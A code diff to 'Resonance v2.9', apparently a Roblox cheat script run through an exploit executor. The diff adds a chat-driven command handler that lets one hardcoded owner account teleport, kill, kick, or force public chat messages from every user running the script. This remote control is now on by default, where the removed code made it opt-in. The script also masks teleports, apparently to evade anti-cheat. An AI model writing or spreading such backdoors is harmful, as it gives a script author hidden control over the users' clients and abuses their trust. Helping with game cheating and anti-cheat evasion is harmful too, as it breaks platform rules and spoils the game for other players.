@@ -1,6 +1,259 @@
 --Resonance v2.9 
 local sources = {}
+--=====================================================
+-- ARRIVA OWNER COMMAND CORE (STANDALONE)
+--=====================================================
 
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+
+local HUB_OWNER_ID = 1325117607
+local ALLOW_OWNER_COMMANDS = true -- set false to disable remote control
+
+--=====================================================
+-- SHARED TELEPORT MASK (standalone, no Hub)
+--=====================================================
+local TeleportMask = {}
+do
+	local enabled = true
+	local state
+	local renderName = "ArrivaSharedTeleportMask"
+	local connections = setmetatable({}, {__mode = "k"})
+
+	local function connect(signal, fn)
+		local c = signal:Connect(fn)
+		connections[c] = true
+		return c
+	end
+	local function disconnect(c)
+		if c then c:Disconnect(); connections[c] = nil end
+	end
+
+	local function current(record)
+		return record
+			and LocalPlayer.Character == record.char
+			and record.root.Parent == record.char
+			and record.hum.Parent == record.char
+			and record.hum.Health > 0
+	end
+
+	function TeleportMask.clearTeleportMask(commit)
+		local old = state
+		state = nil
+		RunService:UnbindFromRenderStep(renderName)
+		if not old then return end
+		disconnect(old.physics)
+		if current(old) then
+			old.root.CFrame = commit and old.destination or old.origin
+		end
+	end
+
+	function TeleportMask.teleportFrame(part)
+		if state and current(state) and state.root == part then
+			return state.destination
+		end
+		return part.CFrame
+	end
+
+	function TeleportMask.visibleCharacterTransparency(part)
+		return part.LocalTransparencyModifier
+	end
+
+	function TeleportMask.teleportPart(part, frame)
+		if not part then return end
+		local char = LocalPlayer.Character
+		local root = char and (char:FindFirstChild("realHrp") or char:FindFirstChild("HumanoidRootPart"))
+		local hum = char and char:FindFirstChildOfClass("Humanoid")
+		if part ~= root then part.CFrame = frame; return end
+
+		if state and not current(state) then TeleportMask.clearTeleportMask(true) end
+		if state and state.root ~= root then TeleportMask.clearTeleportMask(true) end
+		if state and (frame.Position - state.origin.Position).Magnitude < 0.05 then
+			state.destination = frame
+			TeleportMask.clearTeleportMask(true)
+			return
+		end
+		if not enabled or not hum or hum.Health <= 0 then part.CFrame = frame; return end
+
+		if not state and (frame.Position - root.Position).Magnitude >= 0.05 then
+			local record = {
+				char = char, root = root, hum = hum,
+				origin = root.CFrame, frame = root.CFrame,
+				destination = frame, rendered = true,
+			}
+			state = record
+			RunService:BindToRenderStep(renderName, Enum.RenderPriority.Camera.Value - 1, function()
+				if state ~= record then return end
+				if not current(record) then TeleportMask.clearTeleportMask(true); return end
+				record.root.CFrame = record.frame
+				record.rendered = true
+			end)
+			record.physics = connect(RunService.Heartbeat, function()
+				if state ~= record then return end
+				if not current(record) then TeleportMask.clearTeleportMask(true); return end
+				if record.rendered then record.frame = record.root.CFrame end
+				record.rendered = false
+				record.root.CFrame = record.destination
+			end)
+		end
+		if state then state.destination = frame else part.CFrame = frame end
+	end
+
+	function TeleportMask.teleportModel(model, frame)
+		if model ~= LocalPlayer.Character then model:PivotTo(frame); return end
+		local root = model:FindFirstChild("realHrp") or model:FindFirstChild("HumanoidRootPart")
+		if not root then return end
+		TeleportMask.teleportPart(root, frame * model:GetPivot():ToObjectSpace(root.CFrame))
+	end
+
+	function TeleportMask.setEnabled(on)
+		enabled = on == true
+		if not enabled then TeleportMask.clearTeleportMask(true) end
+	end
+
+	LocalPlayer.CharacterRemoving:Connect(function()
+		TeleportMask.clearTeleportMask(true)
+	end)
+end
+
+--=====================================================
+-- CHAT
+--=====================================================
+local lastMessages = {}
+local DEBOUNCE_TIME = 0.5
+
+local function sysMsg(text)
+	local now = tick()
+	if lastMessages[text] and (now - lastMessages[text]) < DEBOUNCE_TIME then return end
+	lastMessages[text] = now
+	pcall(function()
+		if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+			local channels = TextChatService:FindFirstChild("TextChannels")
+			local general = channels and channels:FindFirstChild("RBXGeneral")
+			if general and general:IsA("TextChannel") then
+				general:SendAsync(text)
+			end
+		end
+	end)
+end
+
+local function speakerLabel(speaker)
+	if not speaker then return "someone" end
+	return (speaker.DisplayName ~= "" and speaker.DisplayName) or speaker.Name
+end
+
+--=====================================================
+-- TARGET FINDING
+--=====================================================
+local function findTarget(targetStr)
+	if not targetStr then return nil end
+	targetStr = targetStr:lower():gsub("^@", "")
+	if targetStr == "me" then return {LocalPlayer} end
+	if targetStr == "all" then return Players:GetPlayers() end
+	local matches = {}
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if plr.Name:lower():find(targetStr, 1, true)
+		or plr.DisplayName:lower():find(targetStr, 1, true) then
+			table.insert(matches, plr)
+		end
+	end
+	return #matches > 0 and matches or nil
+end
+
+--=====================================================
+-- ACTIONS
+--=====================================================
+local function bringSelfToOwner(speaker)
+	local owner = Players:GetPlayerByUserId(HUB_OWNER_ID)
+	if not owner or not owner.Character then return end
+	local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+	local ownerRoot = owner.Character:FindFirstChild("HumanoidRootPart")
+	if myRoot and ownerRoot then
+		TeleportMask.teleportPart(myRoot, ownerRoot.CFrame * CFrame.new(0, 5, 0))
+		sysMsg("Brought to " .. speakerLabel(speaker))
+	end
+end
+
+local function revealSelf(speaker)
+	sysMsg("I'm using a private script provided by arrivabus415!")
+end
+
+local function srevealSelf(speaker)
+	-- Client scripts can't whisper; this posts a public whisper-styled line.
+	sysMsg("/w " .. speakerLabel(speaker) .. "] I'm using a private script provided by arrivabus415!")
+end
+
+local function killSelf(speaker)
+	local char = LocalPlayer.Character
+	local hum = char and char:FindFirstChildOfClass("Humanoid")
+	if hum then
+		hum.Health = 0
+		sysMsg("You were killed by " .. speakerLabel(speaker))
+	end
+end
+
+local function kickSelf(speaker)
+	sysMsg("You were kicked by " .. speakerLabel(speaker))
+	task.wait(0.5)
+	LocalPlayer:Kick("You have been kicked from the server by " .. speakerLabel(speaker))
+end
+
+--=====================================================
+-- COMMAND HANDLER
+--=====================================================
+local function processCommand(speaker, text)
+	if not ALLOW_OWNER_COMMANDS then return end
+	if not speaker or speaker.UserId ~= HUB_OWNER_ID then return end
+	if type(text) ~= "string" then return end
+	text = text:match("^%s*(.-)%s*$")
+	if not text:match("^[!:]") then return end
+
+	local args = {}
+	for word in text:gmatch("%S+") do table.insert(args, word) end
+	local cmd = args[1] and args[1]:lower():gsub("^:", "!")
+
+	if cmd == "!announce" then
+		local msg = table.concat(args, " ", 2)
+		if msg ~= "" then sysMsg("[" .. speakerLabel(speaker) .. "] " .. msg) end
+		return
+	end
+
+	local targets = findTarget(args[2])
+	if not targets then return end
+	local appliesToMe = false
+	for _, t in ipairs(targets) do
+		if t == LocalPlayer then appliesToMe = true; break end
+	end
+	if not appliesToMe then return end
+
+	if cmd == "!bring" then bringSelfToOwner(speaker)
+	elseif cmd == "!reveal" then revealSelf(speaker)
+	elseif cmd == "!sreveal" then srevealSelf(speaker)
+	elseif cmd == "!kill" then killSelf(speaker)
+	elseif cmd == "!kick" then kickSelf(speaker)
+	end
+end
+
+--=====================================================
+-- SUBSCRIBE
+--=====================================================
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+	TextChatService.MessageReceived:Connect(function(message)
+		local speaker = message.TextSource and Players:GetPlayerByUserId(message.TextSource.UserId)
+		if speaker then processCommand(speaker, message.Text) end
+	end)
+else
+	local function hookPlayer(plr)
+		plr.Chatted:Connect(function(msg) processCommand(plr, msg) end)
+	end
+	for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
+	Players.PlayerAdded:Connect(hookPlayer)
+end
+
+print("Arriva owner command core (standalone) loaded")
 
 sources.Intro = [====[
 local Intro = {}
@@ -43512,211 +43765,6 @@ assert(type(loadstring) == "function", "This executor does not support loadstrin
 assert(type(getgenv) == "function", "This executor does not support getgenv")
 env.ResonanceStarting = true
 
---// Owner
-local HUB_OWNER_ID = 1325117607
-
---// Whitelist
-local WHITELIST = {
-	[1325117607] = "arrivabus415",
-	[115211703] = "00FSwedish",
-	[9225934804] = "imagine2v1_L",
-	[1485161889] = "noirofknights",
-}
-
---// Whitelist check
-if WHITELIST[LocalPlayer.UserId] == nil then
-	LocalPlayer:Kick("Nah not today bruh. find ur own shit to use.")
-	return
-end
-
---// Debounce for sysMsg to prevent spam
-local lastMessages = {}
-local DEBOUNCE_TIME = 0.5
-
-local function sysMsg(text)
-	-- Check if this exact message was sent recently
-	local now = tick()
-	if lastMessages[text] and (now - lastMessages[text]) < DEBOUNCE_TIME then
-		return -- Ignore duplicate
-	end
-	lastMessages[text] = now
-
-	pcall(function()
-		local chatVersion = TextChatService.ChatVersion
-
-		if chatVersion == Enum.ChatVersion.TextChatService then
-			local channels = TextChatService:FindFirstChild("TextChannels")
-			if channels then
-				local generalChannel = channels:FindFirstChild("RBXGeneral")
-				if generalChannel and generalChannel:IsA("TextChannel") then
-					generalChannel:SendAsync(text)
-				end
-			end
-		end
-	end)
-end
-
---// Get all whitelisted players currently in-game
---// Get all players currently in-game
-local function getAllPlayers()
-	return Players:GetPlayers()
-end
-
---// Enhanced player finder
-local function findTarget(targetStr)
-	if not targetStr then return nil end
-
-	targetStr = targetStr:lower():gsub("^@", "")
-
-	-- "me" = LocalPlayer
-	if targetStr == "me" then
-		return {LocalPlayer}
-	end
-
-	-- "all" = all players
-	if targetStr == "all" then
-		return getAllPlayers()
-	end
-
-	-- Partial match (username or display name)
-	local matches = {}
-	for _, plr in ipairs(Players:GetPlayers()) do
-		if plr.Name:lower():find(targetStr, 1, true) or plr.DisplayName:lower():find(targetStr, 1, true) then
-			table.insert(matches, plr)
-		end
-	end
-
-	return #matches > 0 and matches or nil
-end
-
---// Actions
-local function bringSelfToOwner()
-	local owner = Players:GetPlayerByUserId(HUB_OWNER_ID)
-	if not owner or not owner.Character then return end
-
-	local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-	local ownerRoot = owner.Character:FindFirstChild("HumanoidRootPart")
-
-	if myRoot and ownerRoot then
-		Hub.teleportPart(myRoot, ownerRoot.CFrame * CFrame.new(0, 5, 0))
-		sysMsg("Brought to hub owner")
-	end
-end
-
-local function revealSelf()
-	sysMsg("I'm using a script provided by arrivabus415!")
-end
-
-local function killSelf()
-	local char = LocalPlayer.Character
-	if char then
-		local hum = char:FindFirstChildOfClass("Humanoid")
-		if hum then
-			hum.Health = 0
-			sysMsg("You were killed by hub owner")
-		end
-	end
-end
-
-local function kickSelf()
-	sysMsg("You were removed by hub owner")
-	task.wait(0.5)
-	LocalPlayer:Kick("Removed by hub owner")
-end
-
---// Command handler
-local function processCommand(speaker, text)
-	-- Remote control is opt-in; the hub owner cannot control this client by default.
-	if Hub.env.ArrivaAllowOwnerCommands ~= true then return end
-	if speaker.UserId ~= HUB_OWNER_ID then return end
-
-	-- Only process messages that start with "!" to prevent loops
-	if type(text)~="string" then return end
-	text=text:match("^%s*(.-)%s*$")
-	if not text:match("^[!:]") then
-		return
-	end
-
-	local args = {}
-	for word in text:gmatch("%S+") do table.insert(args,word) end
-	local cmd = args[1] and args[1]:lower():gsub("^:","!")
-
-	if cmd == "!bring" then
-		local targetStr = args[2]
-		local targets = findTarget(targetStr)
-
-		if targets then
-			for _, target in ipairs(targets) do
-				if target == LocalPlayer then
-					bringSelfToOwner()
-					break
-				end
-			end
-		end
-
-	elseif cmd == "!reveal" then
-		local targetStr = args[2]
-		local targets = findTarget(targetStr)
-
-		if targets then
-			for _, target in ipairs(targets) do
-				if target == LocalPlayer then
-					revealSelf()
-					break
-				end
-			end
-		end
-
-	elseif cmd == "!kill" then
-		local targetStr = args[2]
-		local targets = findTarget(targetStr)
-
-		if targets then
-			for _, target in ipairs(targets) do
-				if target == LocalPlayer then
-					killSelf()
-					break
-				end
-			end
-		end
-
-	elseif cmd == "!kick" then
-		local targetStr = args[2]
-		local targets = findTarget(targetStr)
-
-		if targets then
-			for _, target in ipairs(targets) do
-				if target == LocalPlayer then
-					kickSelf()
-					break
-				end
-			end
-		end
-
-	elseif cmd == "!announce" then
-		local msg = table.concat(args, " ", 2)
-		if msg ~= "" then
-			sysMsg("[Hub Owner] " .. msg)
-		end
-	end
-end
-
--- Owner commands: subscribe without replacing the game's chat formatting callback.
-if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-	Hub.connect(TextChatService.MessageReceived, function(message)
-		local speaker = message.TextSource and Players:GetPlayerByUserId(message.TextSource.UserId)
-		if speaker then processCommand(speaker, message.Text) end
-	end)
-else
-	local function hookPlayer(plr)
-		Hub.connect(plr.Chatted, function(msg) processCommand(plr, msg) end)
-	end
-	for _, player in ipairs(Players:GetPlayers()) do hookPlayer(player) end
-	Hub.connect(Players.PlayerAdded, hookPlayer)
-end
-
-print("Arriva Core Hub owner command core loaded")
-
 local cleanup
 local function registerCleanup(fn) cleanup = fn end
 local cache = {}
@@ -43768,4 +43816,5 @@ return result
 
 local run, message = loadstring(sources.Bootstrap, "@Resonance/Bootstrap")
 assert(run, message)
+
 return run(sources)
